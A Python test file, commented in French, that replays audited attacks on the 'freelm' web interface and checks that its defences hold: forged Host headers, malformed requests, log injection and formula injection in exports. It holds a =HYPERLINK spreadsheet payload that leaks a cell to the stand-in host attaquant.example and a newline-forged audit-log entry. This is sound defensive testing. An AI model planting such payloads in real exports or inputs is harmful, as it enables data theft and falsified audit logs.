"""Tests de non-régression de l'audit de sécurité : chaque test rejoue une attaque
démontrée lors de l'audit et vérifie qu'elle échoue désormais."""

import csv
import http.client
import importlib.util
import io
import json
import logging
import socket
import tempfile
import threading
import time
import unittest
from datetime import datetime, timedelta
from unittest import mock

from freelm.config import AuthConfig, ConfigError, load_config, parse_config
from freelm.simulation.demo import run_demo
from freelm.web import api
from freelm.web.auth import Auth, AuthError, LdapAuthenticator, UserInfo
from freelm.web.server import allowed_host_names, make_server

HAS_OPENPYXL = importlib.util.find_spec("openpyxl") is not None
MONDAY = datetime(2024, 9, 23)
PAYLOAD = '=HYPERLINK("http://attaquant.example/?"&A1,"Cliquez ici")'


class Directory:
    def authenticate(self, username, password):
        if username == "jdupont" and password == "ok":
            return UserInfo("jdupont")
        raise AuthError("Identifiant ou mot de passe incorrect")


class _Server(unittest.TestCase):
    web: dict = {}

    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.TemporaryDirectory()
        demo = run_demo(cls.tmp.name, days=2, end=MONDAY + timedelta(days=2), make_report=False)
        raw = load_config(demo.config_path)
        cls.cfg = parse_config({"database": {"connection_string": raw.database.connection_string},
                                "servers": [], "web": cls.web})
        auth = Auth(cls.cfg.web.auth, authenticator=Directory() if cls.cfg.web.auth.mode == "ldap" else None)
        cls.httpd = make_server(cls.cfg, port=0, auth=auth)
        cls.port = cls.httpd.server_address[1]
        threading.Thread(target=cls.httpd.serve_forever, daemon=True).start()

    @classmethod
    def tearDownClass(cls):
        cls.httpd.shutdown()
        cls.httpd.server_close()
        cls.tmp.cleanup()

    def get(self, path, host=None, method="GET", body=None, headers=None):
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=10)
        conn.putrequest(method, path, skip_host=True)
        conn.putheader("Host", host or f"127.0.0.1:{self.port}")
        for k, v in (headers or {}).items():
            conn.putheader(k, v)
        data = json.dumps(body).encode() if body is not None else b""
        if method == "POST":
            conn.putheader("Content-Type", "application/json")
            conn.putheader("Content-Length", str(len(data)))
        conn.endheaders(data if method == "POST" else None)
        r = conn.getresponse()
        out = (r.status, r, r.read())
        conn.close()
        return out


class HostHeaderTest(_Server):
    """H1 — DNS rebinding : un site tiers ne doit pas pouvoir lire l'interface."""

    def test_forged_host_rejected(self):
        status, _, body = self.get("/api/export?type=sessions&format=csv", host="attaquant.example.com")
        self.assertEqual(status, 421)
        self.assertNotIn(b";", body)  # aucune donnée renvoyée

    def test_local_names_accepted(self):
        for host in (f"localhost:{self.port}", f"127.0.0.1:{self.port}", f"[::1]:{self.port}", "LOCALHOST"):
            self.assertEqual(self.get("/api/meta", host=host)[0], 200, host)

    def test_allowed_hosts_config(self):
        cfg = parse_config({"database": {"connection_string": "sqlite:///:memory:"}, "servers": [],
                            "web": {"public_url": "https://freelm.entreprise.local:8443",
                                    "allowed_hosts": ["10.1.2.3"]}})
        names = allowed_host_names(cfg, "127.0.0.1")
        self.assertTrue({"freelm.entreprise.local", "10.1.2.3", "localhost"} <= names)
        self.assertNotIn("attaquant.example.com", names)
        cfg.web.allowed_hosts = ["*"]
        self.assertIsNone(allowed_host_names(cfg, "0.0.0.0"))


class RobustnessTest(_Server):
    """M1, M2, L1, L2 — déni de service et fuites d'information."""

    web = {"request_timeout_s": 1, "max_connections": 3}

    def test_negative_content_length(self):
        s = socket.create_connection(("127.0.0.1", self.port), timeout=5)
        s.sendall(b"POST /api/login HTTP/1.1\r\nHost: localhost\r\nContent-Length: -1\r\n\r\n{}")
        answer = s.recv(200)
        s.close()
        self.assertTrue(answer.startswith(b"HTTP/1.0 4"), answer)  # réponse immédiate, pas de blocage

    def test_idle_connection_is_closed(self):
        s = socket.create_connection(("127.0.0.1", self.port), timeout=5)
        start = time.time()
        data = s.recv(100)  # le serveur coupe la connexion inactive
        s.close()
        self.assertEqual(data, b"")
        self.assertLess(time.time() - start, 4)

    def test_connection_cap(self):
        idle = [socket.create_connection(("127.0.0.1", self.port)) for _ in range(3)]
        time.sleep(0.2)
        s = socket.create_connection(("127.0.0.1", self.port), timeout=5)
        s.sendall(b"GET /api/meta HTTP/1.1\r\nHost: localhost\r\n\r\n")
        try:
            refused = s.recv(100) == b""
        except ConnectionResetError:
            refused = True
        s.close()
        for c in idle:
            c.close()
        self.assertTrue(refused, "la 4e connexion aurait dû être refusée")
        time.sleep(1.5)  # les emplacements se libèrent
        self.assertEqual(self.get("/api/meta")[0], 200)

    def test_no_version_in_server_header(self):
        _, r, _ = self.get("/login.html")
        self.assertEqual(r.getheader("Server").strip(), "FreeLM")

    def test_internal_error_is_generic(self):
        with mock.patch.object(api, "run_report", side_effect=RuntimeError(r"C:\secret\chemin.db verrouillé")):
            status, _, body = self.get("/api/report?type=summary")
        self.assertEqual(status, 500)
        self.assertNotIn(b"secret", body)

    def test_date_overflow_is_client_error(self):
        self.assertEqual(self.get("/api/report?type=summary&start=9999-12-30&end=9999-12-31")[0], 400)


class AuditLogInjectionTest(_Server):
    """M4 — un identifiant contenant des retours à la ligne ne forge pas de ligne d'audit."""

    web = {"auth": {"mode": "ldap", "ldap_servers": ["ldaps://dc"], "base_dn": "DC=x", "upn_suffix": "x"}}

    def test_newlines_neutralized(self):
        forged = "x\n2026-09-27 13:00:00 INFO    freelm.audit - Connexion : admin depuis 10.0.0.1"
        with self.assertLogs("freelm.audit", "INFO") as logs:
            status, _, _ = self.get("/api/login", method="POST", body={"username": forged, "password": "y"})
        self.assertEqual(status, 401)
        line = logs.records[0].getMessage()
        self.assertNotIn("\n", line)
        self.assertIn("\\x0a", line)


class FormulaInjectionTest(unittest.TestCase):
    """M3 — aucune formule exécutable dans les exports CSV / Excel."""

    result = {
        "type": "sessions", "title": "Sessions", "description": "test", "notes": [], "kpis": [],
        "columns": [{"key": "u", "label": "Utilisateur", "type": "text"}, {"key": "h", "label": "Heures", "type": "hours"}],
        "rows": [{"u": PAYLOAD, "h": 1.5}, {"u": "@SUM(1+1)", "h": -2.0}, {"u": "-2+3", "h": 0.0}, {"u": "jdupont", "h": 2.0}],
        "chart": {"kind": "bar", "format": "hours", "title": "t", "items": [{"label": PAYLOAD, "value": 1.5}]},
    }

    def test_csv(self):
        text = api.export_csv(self.result).decode("utf-8-sig")
        cells = [row[0] for row in csv.reader(io.StringIO(text), delimiter=";")][1:]
        self.assertEqual(cells, ["'" + PAYLOAD, "'@SUM(1+1)", "'-2+3", "jdupont"])
        self.assertIn("-2", text)  # les nombres négatifs restent des nombres

    @unittest.skipUnless(HAS_OPENPYXL, "openpyxl non installé")
    def test_xlsx(self):
        from openpyxl import load_workbook

        wb = load_workbook(io.BytesIO(api.export_xlsx(self.result)))
        for ws in wb.worksheets:
            for row in ws.iter_rows():
                for cell in row:
                    if isinstance(cell.value, str) and cell.value.startswith("="):
                        self.assertEqual(cell.data_type, "s", f"{ws.title}!{cell.coordinate} est une formule")


class TransportSecurityTest(unittest.TestCase):
    """H2, M6 — pas d'identifiants en clair."""

    def test_starttls_failure_aborts_before_bind(self):
        calls = []

        class FakeConnection:
            result = {"description": "unavailable"}
            tls_started = False

            def __init__(self, *a, **k):
                pass

            def open(self):
                calls.append("open")

            def start_tls(self):
                calls.append("start_tls")
                return False

            def bind(self):
                calls.append("bind")  # ne doit jamais arriver : le mot de passe partirait en clair
                return True

            def unbind(self):
                calls.append("unbind")

        fake_ldap3 = type("fake_ldap3", (), {"Connection": FakeConnection, "SIMPLE": "SIMPLE"})
        auth = LdapAuthenticator.__new__(LdapAuthenticator)
        auth.cfg = AuthConfig(mode="ldap", ldap_servers=["ldap://dc"], base_dn="DC=x", upn_suffix="x.local",
                              ldap_starttls=True)
        auth.ldap3, auth.server, auth.client_strategy = fake_ldap3, None, None
        with self.assertRaises(AuthError) as ctx:
            auth.authenticate("jdupont", "Secret-1")
        self.assertNotIn("bind", calls)
        self.assertEqual(ctx.exception.reason, "STARTTLS non établi")

    def test_smtp_credentials_without_encryption_refused(self):
        with self.assertRaises(ConfigError):
            parse_config({"database": {"connection_string": "sqlite:///:memory:"}, "servers": [],
                          "email": {"smtp_host": "smtp", "security": "none", "username": "u", "password": "p"}})


if __name__ == "__main__":
    logging.disable(logging.CRITICAL)
    unittest.main()
